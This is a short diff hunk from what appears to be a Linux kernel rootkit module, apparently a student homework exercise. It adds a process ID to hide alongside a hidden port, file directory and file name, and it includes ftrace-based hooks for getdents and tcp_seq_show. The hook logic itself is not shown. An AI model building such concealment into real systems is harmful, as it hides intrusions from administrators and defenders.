@@ -19,13 +19,13 @@
 #include <linux/fdtable.h>
 #include <linux/limits.h>
 
-#include "ftrace_utils.h"
-#include "syshook_utils.h"
-
 #define HIDDEN_PORT 8080
 #define HIDDEN_FILE_DIR "/home/student/projects/hw"
 #define HIDDEN_FILE_NAME "myfile"
+#define HIDDEN_PID "4038"
 
+#include "ftrace_utils.c"
+#include "syshook_utils.c"
 #include "hook_functions/tcp_seq_show.c"
 #include "hook_functions/getdents.c"
 
